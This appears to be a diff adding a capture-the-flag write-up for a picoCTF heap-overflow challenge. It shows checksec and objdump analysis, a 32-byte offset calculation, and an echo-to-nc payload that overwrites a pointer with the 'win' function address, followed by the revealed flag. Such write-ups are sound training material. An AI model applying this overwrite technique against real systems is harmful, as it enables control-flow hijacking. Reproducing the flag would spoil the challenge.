@@ -1,0 +1,74 @@
+$ curl -sO https://artifacts.picoctf.net/c_mimas/50/chall.c
+$ curl -sO https://artifacts.picoctf.net/c_mimas/50/chall
+
+---
+# check binary flags
+$ checksec chall
+> RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+> Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   51 Symbols        No    0               2               chall
+
+---
+PIE - position independent executable flag is disabled. Hence all the addresses will remain fixed.
+
+---
+After reading chall.c file, our goal is to store address of `win` function in `x`.
+
+# Check address of `win` function
+$ objdump -t chall | grep win
+> 00000000004011f0 g     F .text	0000000000000011              check_win
+> 00000000004011a0 g     F .text	0000000000000042              win
+
+---
+Address to store: 00000000004011a0
+
+---
+Creating the input string
+
+Run the binary and print the heap by selecting first option. Its output is:
+
+> Enter your choice: 1
+> [*]   Address   ->   Value   
+> +-------------+-----------+
+> [*]   0x166f6b0  ->   pico
+> +-------------+-----------+
+> [*]   0x166f6d0  ->   bico
+
+
+address difference between variable where our value will be stores and `x` variable is 0x20 = 32
+It means, if our input is more than 32 characters, it will overwrite the variable `x`.
+
+Here is how the input will look:
+'AAAABBBBCCCCDDDDAAAABBBBCCCCDDDD<address-of-win-in-little-endian>
+
+---
+
+Generating the payload:
+Steps:
+1. Select 2nd option to write to buffer
+2. Enter 32 char input + address of win in little endian - 8 bytes because it is 64 bit binary.
+3. Select 4th option to print the flag
+
+payload = '2\nAAAABBBBCCCCDDDDAAAABBBBCCCCDDDD\xa0\x11\x40\x00\x00\x00\x00\x00\n4\n'
+
+
+---
+Running the exploit
+
+echo -e '2\nAAAABBBBCCCCDDDDAAAABBBBCCCCDDDD\xa0\x11\x40\x00\x00\x00\x00\x00\n4\n' | nc mimas.picoctf.net 59437
+
+I have a function, I sometimes like to call it, maybe you should change it
+
+1. Print Heap
+2. Write to buffer
+3. Print x
+4. Print Flag
+5. Exit
+
+Enter your choice: Data for buffer: 
+1. Print Heap
+2. Write to buffer
+3. Print x
+4. Print Flag
+5. Exit
+
+Enter your choice: picoCTF{and_down_the_road_we_go_ba77314d}
